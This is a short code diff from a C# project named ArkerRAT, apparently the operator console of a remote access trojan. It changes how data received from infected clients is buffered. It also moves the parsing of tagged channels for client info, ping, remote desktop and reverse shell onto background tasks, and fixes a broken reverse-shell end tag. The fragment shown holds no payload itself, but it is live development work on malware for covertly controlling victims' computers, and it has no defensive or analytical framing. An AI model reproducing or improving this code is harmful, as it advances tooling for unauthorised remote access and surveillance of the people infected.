@@ -16,6 +16,7 @@ using System.Diagnostics;
 using ArkerRatWpfVersion;
 using System.Windows.Markup;
 using System.Xml.Linq;
+using System.Collections.Concurrent;
 
 namespace ArkerRAT1
 {
@@ -44,6 +45,7 @@ namespace ArkerRAT1
 
             ReadData();
             Ping();
+            
         }
 
         public async Task SendData(string textData)
@@ -81,13 +83,14 @@ namespace ArkerRAT1
 
                             lock (GlobalVariables._lock)
                             {
-                                data = stringBuilder.ToString();
+                                data += stringBuilder.ToString();
                             }
 
-                            SortData("§ClientInfoStart§", "§ClientInfoEnd§");
-                            SortData("§PingStart§", "§PingEnd§");
-                            SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§");
-                            SortData("§ReverseShellStart§", "§ReverseShellEnd");
+                            await Task.Run(() => SortData("§ClientInfoStart§", "§ClientInfoEnd§"));
+                            await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
+                            await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
+                            await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
+
 
                             stringBuilder.Clear();
                         }
